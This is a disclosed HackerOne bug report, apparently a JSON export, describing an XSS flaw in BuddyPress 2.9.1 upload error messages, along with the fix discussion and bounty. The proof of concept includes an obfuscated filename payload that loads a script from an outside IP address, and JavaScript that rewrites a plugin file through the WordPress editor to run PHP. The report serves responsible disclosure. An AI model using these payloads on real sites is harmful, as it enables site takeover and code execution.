{"id":263109,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjMxMDk=","url":"https://hackerone.com/reports/263109","title":"Buddypress 2.9.1 - Exceeding the maximum upload size  - XSS leading to potential RCE. ","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-08-24T22:55:44.354Z","submitted_at":"2017-08-24T22:55:44.354Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"skansing","url":"/skansing","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":55,"url":"https://hackerone.com/wordpress","handle":"wordpress","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"WordPress","twitter_handle":"wordpress","website":"https://wordpress.org/","about":"Beautiful sites of any kind."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-11-02T17:04:35.375Z","bug_reporter_agreed_on_going_public_at":"2017-11-02T17:02:53.537Z","team_member_agreed_on_going_public_at":"2017-11-02T17:04:35.296Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Description\nThis report is very similar to https://hackerone.com/bugs?subject=user\u0026report_id=203515 so I will not go into too much details.\n\nWhen uploading a avatar or profile background image thats larger than allowd, the error containing the filename will be output unsanitized leading to XSS. Making the victim upload a strangely named file for his profile requires some social engineering. Any user is vuln, but has to be admin to escalate to RCE.\n\nThe interfaces for upload that are vuln can be found at\ndomain.tld/members/USERNAME/profile/change-cover-image/\ndomain.tld/members/bbuser/profile/change-avatar/\ndomain.tld/wp-admin/users.php?page=bp-profile-edit\n \n# POC\nThe POC explores a chain of XSS =\u003e XSSI =\u003e RCE via same origin scripting, the route via XSSI is mainly due to file and char length restrictions\n\n- Login as admin\n- Goto `/wp-admin/users.php?page=bp-profile-edit`\n- Upload a file with the following name (mentioned below) as admin for.\n\nFilename \n`POC\u003cimg src=x onerror='document.write(atob(\"UnVubmluZyBQT0M8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwOi8vMTU5LjIwMy4xOTAuMTIzL3c5cmZhczg5ZXVmczllOGZ1OThld3VmandlZmlvandlX3MxMDU4Zy0vd3AtcmNlLmpzIj48L3NjcmlwdD4=\"))'\u003e`\n\nThe base64 data can be verified by\n`btoa('Running POC\u003cscript type=\"text/javascript\" src=\"http://159.203.190.123/w9rfas89eufs9e8fu98ewufjwefiojwe_s1058g-/wp-rce.js\"\u003e\u003c/script\u003e');` in the browser conole.\n\nThis scripts loads the RCE script that changes the hello.php with \u003c?php phpinfo() and redirect to it.\n```\nvar i = document.createElement(\"iframe\");\ni.src = \"http://127.0.0.1:8090/wp-admin/plugin-editor.php?file=hello.php\";\ndocument.querySelector(\"body\").appendChild(i);\nsetTimeout(function() {\n  var p = \"\u003c?php phpinfo();\"\n  var d = document.querySelector(\"iframe\").contentWindow.document;\n  var c = d.querySelector(\"#newcontent\")\n  var s = d.querySelector(\"#submit\")\n  c.value = p\n  s.click();\n}, 2000);\nsetTimeout(function() {\n  window.location.href = \"http://127.0.0.1:8090/wp-content/plugins/hello.php\"\n}, 4000);\n```\n\n# Suggested fix\nSanitize the error. I suspect it needs a run through `.html()` as in #203515\n","bounty_amount":"275.0","formatted_bounty":"$275","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-12-02T17:02:53.975Z","allow_singular_disclosure_after":-121728609.68512423,"singular_disclosure_allowed":true,"vote_count":14,"voters":["jokebookservice1","jdgrimes","jensec","bl4de","skansing","eveeez","khizer47","cr4xerbik4sh","japz","dolph1n","and 4 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1953328,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2017-08-24T23:07:17.311Z","updated_at":"2017-08-24T23:07:17.311Z","additional_data":{"old_title":"Buddypress 2.9.1 - Exceeding the maximum upload size  - XSS to RCE. ","new_title":"Buddypress 2.9.1 - Exceeding the maximum upload size  - XSS leading to potential RCE. "},"actor":{"username":"skansing","cleared":false,"url":"/skansing","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1956295,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hey @skansing,\n\nSorry it took a little longer to get to this one. Moving this to triaged as well since I was able to reproduce it.","automated_response":false,"created_at":"2017-08-26T01:48:01.514Z","updated_at":"2017-08-26T01:48:01.514Z","actor":{"username":"voldemortensen","cleared":false,"url":"/voldemortensen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/090/577/2f2c151123b2d4917e8791b96987f0fde30d95bc_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2122169,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @skansing - Many apologies for the radio silence. I got confused about the status of the related WP ticket, and as a result this one fell off my radar.\n\nI've confirmed the issue, and written a patch along the lines of what you suggest above. Could you please confirm that it solves the problem for you?\n\nThe BP team has already scheduled a release for tomorrow for unrelated reasons. If we're able to review and confirm the patch internally by then, we hope to include it. Otherwise, we are aiming to have another maintenance release that could contain this security fix within the following two weeks. I'll follow up here when I have more details about timeline.","automated_response":false,"created_at":"2017-11-01T18:38:07.977Z","updated_at":"2017-11-01T18:38:07.977Z","actor":{"username":"boonebgorges","cleared":false,"url":"/boonebgorges","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":235263,"filename":"error-xss.diff","type":"text/x-diff","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/235/263/7c01ee0dbec7db465a67cd91f6150e8fdc976326/error-xss.diff?response-content-disposition=attachment%3B%20filename%3D%22error-xss.diff%22%3B%20filename%2A%3DUTF-8%27%27error-xss.diff\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZV3IBMDT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T143303Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHx%2BIgfH0%2FRLQqbPD5vv6PNps92HY0yneL0kxkNwZHOyAiALrXRJqTvQQGm0xEkYGCB0kbPjUCCkzSeRztvcuetAYyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIM5FTPTB1nK4gXIBLuKtcDHmLbKhsWpyXKgWy1fAYOf0DZEqCEqF9ns7RwihS1bFM9%2BSDXYY0CmIqutWQhK5asoL8jbJZ39%2FJ2eai2SoxTlg3PhjMpNNSUfPFgauwX6vt%2FoeK9VnB1Hmqg6bCNA62qIJPnlTONluGngv604Y6CnYL9Se%2B%2BjgOpqhqmIOX9KlzGAoRM0Ci%2BrWGdELH8Q66bSHmapdLHPWMoGBEj%2BeruK3oCs%2BDaUQ1aE%2FEQ8R5PgqLM3Pq6DrZV9PlFixmkikk8SpDcsFEiT0Zw0gsy2qPz3z3BHAEuG64GguAhIs5FvYP7HbdpPv7rQz4QSDXgN3SIbVD0A4kcV1iNQpZyiw2rmdxuUWIk46d%2FT0u%2B7j9yAdfpDuPVKPDHJD35k0pB6VLe7RtlSwwvcDUa7LL6FJxvOPpupIMPSy51BJl9%2Bf8022a6pcy263zeRDGJjALAc6brW%2BvQoDUu%2FQP%2BdxwOLZvXCyyGJp2%2BK86jg8qU%2FLWZ4DVeR3bIO1n7Fw%2B53iFlBIMatC3ZSLlV1J7dSDCk74u6OWvql%2Brvb6q%2Bj8NHQK6luFckQV%2B9okMhTYuNniW3sHS8rjyNrrGhP8vMtxMzink9EL%2FmU0Oxusg2wmaXCDfIKpDDmspvZQv8MJ%2F%2FkIsGOqYBaz2hfRV48KDU0Mx0UomuXdEWK6oszm51EnI%2FeSepVmINgIWWggB7gENawN0rgfpMSIqQjB%2BpErtoDw1jNWaknZlAG9GLkCZ49lNHNirjr7iPk7LouunUzSZjaag8Yc19L8BAWjyLZnHXpqUZQRBSoqOcAoct3F46M7AzK2ewXHmh7aKY3cfAQTu9yVTJd2CDpuLtlyUDUa37BJ8%2F84puzgJS34jmeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=80490aa257d6ddede7a981b4a4e804b1cb175d83877a3dbd1e0d69d112629e9e"}],"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2122732,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @boonebgorges - thanks for the response, I have tested the diff locally by overwritting the `bp-plupload.min.js` with the contents of a patched `bp-plupload.js`, I guess the minimized file is build somehow is the deploy/build process before release. It did the trick, neither of the 3 areas had any XSS after the change. \n\n","automated_response":false,"created_at":"2017-11-01T21:06:24.478Z","updated_at":"2017-11-01T21:12:30.559Z","actor":{"username":"skansing","cleared":false,"url":"/skansing","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2126291,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Fixed in BP 2.9.2 https://buddypress.org/2017/11/buddypress-2-9-2-security-and-maintenance-release/","automated_response":false,"created_at":"2017-11-02T16:41:33.342Z","updated_at":"2017-11-02T16:41:33.342Z","actor":{"username":"boonebgorges","cleared":false,"url":"/boonebgorges","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"skansing","url":"/skansing"},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2127358,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-11-02T17:02:53.681Z","updated_at":"2017-11-02T17:02:53.681Z","first_to_agree":true,"actor":{"username":"skansing","cleared":false,"url":"/skansing","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2127370,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-11-02T17:04:35.318Z","updated_at":"2017-11-02T17:04:35.318Z","actor":{"username":"boonebgorges","cleared":false,"url":"/boonebgorges","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2127371,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-11-02T17:04:35.397Z","updated_at":"2017-11-02T17:04:35.397Z","actor":{"username":"boonebgorges","cleared":false,"url":"/boonebgorges","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2144136,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2017-11-08T21:00:22.188Z","updated_at":"2017-11-08T21:00:22.188Z","actor":{"url":"/wordpress","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"WordPress"}},"bounty_amount":"225.0","bounty_currency":"usd","bonus_amount":"50.0","genius_execution_id":null,"team_handle":"wordpress","collaborator":{"username":"skansing","url":"/skansing"},"actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}